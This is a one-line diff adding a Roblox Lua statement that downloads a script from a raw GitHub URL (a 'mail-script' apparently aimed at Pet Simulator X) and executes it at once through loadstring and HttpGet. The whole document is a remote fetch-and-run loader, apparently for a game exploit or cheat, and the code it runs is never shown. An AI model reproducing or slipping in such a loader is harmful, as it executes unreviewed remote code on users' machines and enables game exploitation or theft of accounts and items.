@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PPHC2/mail-script-v2/main/psx%20script"))()
